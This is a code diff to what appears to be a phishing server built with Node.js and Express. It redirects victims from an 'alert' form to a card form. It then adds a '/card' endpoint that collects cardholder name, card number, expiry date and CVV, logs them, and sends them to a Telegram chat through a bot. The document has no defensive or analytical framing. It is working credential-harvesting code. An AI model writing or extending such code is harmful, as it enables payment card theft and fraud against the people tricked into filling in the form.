@@ -63,11 +63,29 @@ app.post("/alert", (req, res) => {
   bot.sendMessage(TELEGRAM_CHAT_ID, alertMessage)
     .then(() => {
       console.log("Alert data sent to Telegram");
-      res.send("Alert information submitted successfully!");
+      res.redirect("/card.html");
     })
     .catch((error) => {
       console.error("Error sending alert data to Telegram:", error.message);
       res.status(500).send("Error sending alert data to Telegram");
+    });
+});
+
+// Handle POST request for card form (card.html)
+app.post("/card", (req, res) => {
+  const { cardholder, cardnumber, exp, cvv } = req.body;
+  console.log("Received card data:", { cardholder, cardnumber, exp, cvv });
+
+  // Send card data to Telegram
+  const cardMessage = `Card information submitted:\nCardholder: ${cardholder}\nCard Number: ${cardnumber}\nExpiry: ${exp}\nCVV: ${cvv}`;
+  bot.sendMessage(TELEGRAM_CHAT_ID, cardMessage)
+    .then(() => {
+      console.log("Card data sent to Telegram");
+      res.send("Card information submitted successfully!");
+    })
+    .catch((error) => {
+      console.error("Error sending card data to Telegram:", error.message);
+      res.status(500).send("Error sending card data to Telegram");
     });
 });
 
